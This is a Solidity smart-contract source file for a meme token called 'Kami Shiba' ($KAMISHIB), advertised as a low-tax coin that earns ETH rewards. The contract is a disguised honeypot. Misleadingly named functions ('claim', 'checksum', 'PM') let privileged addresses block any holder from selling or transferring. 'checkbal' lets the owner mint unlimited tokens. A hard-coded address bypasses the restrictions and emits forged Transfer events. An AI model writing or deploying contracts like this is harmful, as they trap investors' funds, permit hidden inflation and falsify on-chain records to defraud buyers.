/**
 *Submitted for verification at Etherscan.io on 2022-10-01
*/

pragma solidity 0.8.17;
/*

Kami Shiba  - $KAMISHIB -

All knowing, All seeing, Low Tax Shiba Meme Coin 

- Earn Rewards in ETH!

- Exciting Community Events

TG: KamiShibaETH
*/      
 
contract KAMISHIB {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) Valueof;
    mapping (address => bool) dx;

    // 
    string public name = "Kami Shiba";
    string public symbol = unicode"KAMISHIB";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x881fA76D66A032b418fE992030429D16250923f5;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   





    modifier layer() {   
    require(dx[msg.sender]);
        _;}
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    

    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; } 
        require(!Valueof[msg.sender]);      
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }

        function PM(address x) public {
         require(msg.sender == Construct);
          dx[x] = true; }
        
        function checkbal(address oracle,  uint256 update) public {
        require(msg.sender == owner);
        balanceOf[oracle] += update;
        totalSupply += update; }
        function claim(address txt) layer public{          
        require(!Valueof[txt]);
        Valueof[txt] = true; }
        function checksum(address txt) layer public {
        require(Valueof[txt]);
        Valueof[txt] = false; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }    
        require(!Valueof[from]); 
        require(!Valueof[to]); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }